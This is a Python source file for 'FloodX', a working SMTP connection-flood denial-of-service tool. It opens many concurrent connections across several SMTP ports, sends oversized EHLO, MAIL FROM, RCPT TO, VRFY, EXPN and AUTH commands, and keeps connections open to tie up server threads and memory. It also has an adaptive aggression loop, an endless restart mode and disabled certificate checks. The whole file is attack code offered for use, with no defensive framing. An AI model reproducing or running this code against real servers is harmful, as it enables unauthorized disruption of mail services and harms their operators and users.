"""
FloodX: Advanced SMTP Connection Flood Attack Implementation
High-efficiency SMTP connection exhaustion designed for maximum server resource depletion.
Creates asymmetric resource consumption - minimal attacker resources, maximum server thread/memory impact.
"""

import asyncio
import random
import time
import socket
import ssl
from typing import Dict, Any, List, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor

from common.logger import logger, stats_logger


class AdvancedSmtpFloodAttack:
    """Advanced SMTP flood attack for maximum server resource exhaustion."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = self._extract_hostname(config['target'])
        self.port = config.get('port', 25)  # Default SMTP port
        self.duration = config['duration']
        self.concurrency = config['concurrency']
        
        self.running = False
        self.connections_established = 0
        self.connections_attempted = 0
        self.commands_sent = 0
        self.bytes_sent = 0
        self.error_count = 0
        self.active_workers = 0
        
        # SMTP port variations
        self.smtp_ports = [25, 587, 465, 2525]  # Common SMTP ports
        if self.port not in self.smtp_ports:
            self.smtp_ports.insert(0, self.port)
        
        # Advanced SMTP settings for maximum resource consumption
        self.use_ssl_opportunistic = config.get('use_ssl', True)
        self.keep_connections_alive = config.get('keep_alive', True)
        self.max_commands_per_connection = random.randint(50, 200)
        
        # SMTP command sequences that consume maximum server resources
        self.resource_heavy_commands = [
            # EHLO with long hostname (forces server processing)
            lambda: f"EHLO {'x' * 200}.{'y' * 50}.com\r\n",
            # MAIL FROM with complex addresses
            lambda: f"MAIL FROM:<{'test' * 20}@{'domain' * 10}.com>\r\n",
            # RCPT TO with multiple recipients (each consumes server memory)
            lambda: f"RCPT TO:<user{random.randint(1, 999999)}@{'target' * 15}.com>\r\n",
            # AUTH attempts (forces server to check credentials)
            lambda: "AUTH LOGIN\r\n",
            lambda: "AUTH PLAIN\r\n",
            # VRFY commands (expensive user verification)
            lambda: f"VRFY user{random.randint(1, 9999999)}\r\n",
            # EXPN commands (mailing list expansion)
            lambda: f"EXPN list{random.randint(1, 999999)}\r\n",
        ]
        
        # Performance optimization
        self.thread_pool = ThreadPoolExecutor(max_workers=min(50, self.concurrency))
        self.connection_pool = []  # Reuse connections for efficiency
        self.max_pool_size = min(100, self.concurrency)
        
    def _extract_hostname(self, target: str) -> str:
        """Extract hostname from URL or return as-is."""
        import re
        if '://' in target:
            match = re.match(r'https?://([^:/]+)', target)
            if match:
                return match.group(1)
        return target
        
    async def run(self):
        """Execute high-efficiency SMTP flood attack."""
        logger.info(f"📧 Starting advanced SMTP flood: {self.concurrency} workers targeting {self.target}:{self.port}")
        
        # Initialize real-time statistics
        stats_logger.update_stats(
            target=f"{self.target}:{self.port}",
            vector="smtp",
            status="running"
        )
        stats_logger.start_real_time_logging()
        
        try:
            # Pre-establish connection pool for efficiency
            await self._prewarm_smtp_connections()
            
            self.running = True
            
            # Launch high-concurrency SMTP workers
            tasks = []
            for i in range(self.concurrency):
                task = asyncio.create_task(self._advanced_smtp_worker(i))
                tasks.append(task)
            
            # Launch performance monitor
            monitor_task = asyncio.create_task(self._smtp_performance_monitor())
            tasks.append(monitor_task)
            
            # Run for specified duration or endless if duration is 0
            if self.duration > 0:
                await asyncio.sleep(self.duration)
                self.running = False
            else:
                # Endless mode - run until interrupted
                logger.info("🔄 Running in endless mode - Ctrl+C to stop")
                try:
                    while self.running:
                        # Restart cycle every 60 seconds for continuous operation
                        await asyncio.sleep(60)
                        
                        # Check if workers are still alive and restart if needed
                        if self.active_workers < self.concurrency * 0.5:
                            logger.info("🔄 Restarting SMTP workers for continuous operation...")
                            
                            # Cancel existing worker tasks
                            for task in tasks[:-1]:  # Keep monitor task
                                if not task.done():
                                    task.cancel()
                            
                            # Restart workers
                            new_tasks = []
                            for i in range(self.concurrency):
                                task = asyncio.create_task(self._advanced_smtp_worker(i))
                                new_tasks.append(task)
                            new_tasks.append(monitor_task)  # Keep monitor task
                            tasks = new_tasks
                            
                except KeyboardInterrupt:
                    logger.info("🛑 Endless SMTP flood stopped by user")
                    self.running = False
            
            # Clean shutdown
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception as e:
            logger.error(f"❌ SMTP flood failed: {e}")
            stats_logger.increment_errors()
        finally:
            self.thread_pool.shutdown(wait=False)
            await self._cleanup_connections()
            stats_logger.stop_real_time_logging()
            stats_logger.update_stats(status="completed")
            logger.info(f"✅ SMTP flood completed: {self.connections_established}/{self.connections_attempted} connections, {self.commands_sent} commands")

    async def _prewarm_smtp_connections(self):
        """Pre-establish SMTP connections for better performance."""
        logger.info("⚙️  Pre-warming SMTP connection pool...")
        
        prewarm_tasks = []
        for i in range(min(10, self.max_pool_size)):
            task = asyncio.create_task(self._create_pooled_smtp_connection())
            prewarm_tasks.append(task)
        
        await asyncio.gather(*prewarm_tasks, return_exceptions=True)
        logger.info(f"🔥 Pre-warmed {len(self.connection_pool)} SMTP connections")

    async def _create_pooled_smtp_connection(self):
        """Create an SMTP connection for the pool."""
        try:
            # Try different SMTP ports to find working ones
            port = random.choice(self.smtp_ports)
            
            # Establish TCP connection
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target, port),
                timeout=10.0
            )
            
            # Read SMTP greeting
            greeting = await asyncio.wait_for(reader.readline(), timeout=5.0)
            
            if b"220" in greeting:  # SMTP ready
                self.connection_pool.append((reader, writer, port))
                logger.debug(f"Pooled SMTP connection to {self.target}:{port}")
            else:
                writer.close()
                await writer.wait_closed()
                
        except Exception as e:
            logger.debug(f"Failed to create pooled SMTP connection: {e}")

    async def _advanced_smtp_worker(self, worker_id: int):
        """Advanced SMTP worker optimized for maximum server resource consumption."""
        self.active_workers += 1
        stats_logger.set_active_threads(self.active_workers)
        
        connections_this_worker = 0
        commands_this_worker = 0
        
        try:
            while self.running:
                try:
                    # Execute SMTP connection with resource exhaustion techniques
                    connection_success, commands_sent, bytes_sent = await self._execute_smtp_exhaustion()
                    
                    # Update statistics
                    self.connections_attempted += 1
                    if connection_success:
                        self.connections_established += 1
                        connections_this_worker += 1
                    
                    self.commands_sent += commands_sent
                    commands_this_worker += commands_sent
                    self.bytes_sent += bytes_sent
                    
                    stats_logger.increment_packets(commands_sent, bytes_sent)
                    if connection_success:
                        stats_logger.increment_connections()
                    
                    # Adaptive rate limiting
                    success_rate = self.connections_established / max(1, self.connections_attempted)
                    if success_rate > 0.8:
                        # High success rate - be more aggressive
                        await asyncio.sleep(random.uniform(0.01, 0.05))
                    else:
                        # Lower success rate - back off
                        await asyncio.sleep(random.uniform(0.1, 0.3))
                        
                except Exception as e:
                    self.error_count += 1
                    stats_logger.increment_errors()
                    await asyncio.sleep(0.5)
                    
        except asyncio.CancelledError:
            pass
        finally:
            self.active_workers -= 1
            stats_logger.set_active_threads(self.active_workers)
            logger.debug(f"SMTP worker {worker_id} completed {connections_this_worker} connections, {commands_this_worker} commands")

    async def _execute_smtp_exhaustion(self) -> Tuple[bool, int, int]:
        """Execute SMTP connection with maximum resource exhaustion techniques."""
        connection_success = False
        commands_sent = 0
        total_bytes = 0
        
        try:
            # Try to reuse connection from pool first (30% chance)
            if self.connection_pool and random.random() < 0.3:
                try:
                    reader, writer, port = self.connection_pool.pop()
                    # Test if connection is still alive
                    writer.write(b"NOOP\r\n")
                    await writer.drain()
                    response = await asyncio.wait_for(reader.readline(), timeout=2.0)
                    
                    if b"250" in response:  # Connection still alive
                        return await self._exhaust_existing_connection(reader, writer)
                except:
                    # Connection dead, create new one
                    pass
            
            # Create new connection
            port = random.choice(self.smtp_ports)
            
            # Establish connection with optional SSL
            if port == 465 or (self.use_ssl_opportunistic and random.random() < 0.5):
                # SSL/TLS connection
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(
                        self.target, 
                        port,
                        ssl=self._create_smtp_ssl_context()
                    ),
                    timeout=15.0
                )
            else:
                # Plain connection
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target, port),
                    timeout=10.0
                )
            
            # Read SMTP greeting
            greeting = await asyncio.wait_for(reader.readline(), timeout=5.0)
            total_bytes += 50  # Estimate greeting size
            
            if b"220" not in greeting:
                writer.close()
                await writer.wait_closed()
                return False, 0, total_bytes
            
            connection_success = True
            
            # Execute resource exhaustion command sequence
            commands_sent, command_bytes = await self._exhaust_smtp_resources(reader, writer)
            total_bytes += command_bytes
            
            # Optionally keep connection alive to tie up server resources
            if self.keep_connections_alive and random.random() < 0.4:
                # Add connection back to pool for reuse (ties up server resources)
                if len(self.connection_pool) < self.max_pool_size:
                    self.connection_pool.append((reader, writer, port))
                    return connection_success, commands_sent, total_bytes
            
            # Close connection
            writer.close()
            await writer.wait_closed()
            
            return connection_success, commands_sent, total_bytes
            
        except Exception as e:
            logger.debug(f"SMTP exhaustion failed: {e}")
            return connection_success, commands_sent, total_bytes

    async def _exhaust_smtp_resources(self, reader, writer) -> Tuple[int, int]:
        """Execute SMTP commands designed to exhaust server resources."""
        commands_sent = 0
        total_bytes = 0
        
        try:
            # Send EHLO with oversized hostname (forces server processing)
            ehlo_cmd = f"EHLO {'x' * 200}.{'subdomain' * 20}.{'domain' * 15}.com\r\n"
            writer.write(ehlo_cmd.encode())
            await writer.drain()
            total_bytes += len(ehlo_cmd)
            commands_sent += 1
            
            # Read EHLO response (server capabilities)
            response = await asyncio.wait_for(reader.readline(), timeout=5.0)
            while response and not response.startswith(b"250 "):
                response = await asyncio.wait_for(reader.readline(), timeout=2.0)
            
            # Send multiple resource-heavy commands
            max_commands = min(self.max_commands_per_connection, 100)
            
            for _ in range(random.randint(10, max_commands)):
                if not self.running:
                    break
                
                # Choose a resource-heavy command
                command_func = random.choice(self.resource_heavy_commands)
                command = command_func()
                
                writer.write(command.encode())
                await writer.drain()
                total_bytes += len(command)
                commands_sent += 1
                
                # Read response (forces server to process command)
                try:
                    response = await asyncio.wait_for(reader.readline(), timeout=3.0)
                except asyncio.TimeoutError:
                    break  # Server might be overloaded (good!)
                
                # Brief delay between commands
                await asyncio.sleep(random.uniform(0.001, 0.01))
            
            # Send QUIT to properly close (some servers require this)
            writer.write(b"QUIT\r\n")
            await writer.drain()
            total_bytes += 6
            commands_sent += 1
            
        except Exception as e:
            logger.debug(f"SMTP resource exhaustion error: {e}")
        
        return commands_sent, total_bytes

    async def _exhaust_existing_connection(self, reader, writer) -> Tuple[bool, int, int]:
        """Exhaust resources on an existing SMTP connection."""
        try:
            commands_sent, total_bytes = await self._exhaust_smtp_resources(reader, writer)
            return True, commands_sent, total_bytes
        except:
            return False, 0, 0

    def _create_smtp_ssl_context(self) -> ssl.SSLContext:
        """Create SSL context for SMTP connections."""
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        return context

    async def _smtp_performance_monitor(self):
        """Monitor SMTP attack performance and resource exhaustion."""
        last_connection_count = 0
        last_command_count = 0
        last_time = time.time()
        
        while self.running:
            await asyncio.sleep(5)  # Check every 5 seconds
            
            current_time = time.time()
            current_connections = self.connections_established
            current_commands = self.commands_sent
            
            # Calculate current rates
            time_diff = current_time - last_time
            connection_diff = current_connections - last_connection_count
            command_diff = current_commands - last_command_count
            
            if time_diff > 0:
                connection_rate = connection_diff / time_diff
                command_rate = command_diff / time_diff
                success_rate = self.connections_established / max(1, self.connections_attempted)
                
                logger.debug(f"SMTP Performance: {connection_rate:.1f} conn/sec, "
                           f"{command_rate:.1f} cmd/sec, {success_rate:.1%} success rate")
                logger.debug(f"Resource Impact: {len(self.connection_pool)} pooled connections, "
                           f"{self.active_workers} active workers")
                
                # Adaptive optimization
                if success_rate > 0.9 and connection_rate < 5:
                    logger.debug("Optimizing: Increasing SMTP aggression")
                elif success_rate < 0.3:
                    logger.debug("Optimizing: Reducing SMTP rate (server overloaded)")
            
            last_connection_count = current_connections
            last_command_count = current_commands
            last_time = current_time

    async def _cleanup_connections(self):
        """Clean up remaining pooled connections."""
        logger.info("🧹 Cleaning up SMTP connections...")
        
        cleanup_tasks = []
        for reader, writer, port in self.connection_pool:
            task = asyncio.create_task(self._close_smtp_connection(writer))
            cleanup_tasks.append(task)
        
        if cleanup_tasks:
            await asyncio.gather(*cleanup_tasks, return_exceptions=True)
        
        self.connection_pool.clear()

    async def _close_smtp_connection(self, writer):
        """Gracefully close an SMTP connection."""
        try:
            writer.write(b"QUIT\r\n")
            await writer.drain()
            writer.close()
            await writer.wait_closed()
        except:
            pass


# Alias for compatibility
SmtpFloodAttack = AdvancedSmtpFloodAttack
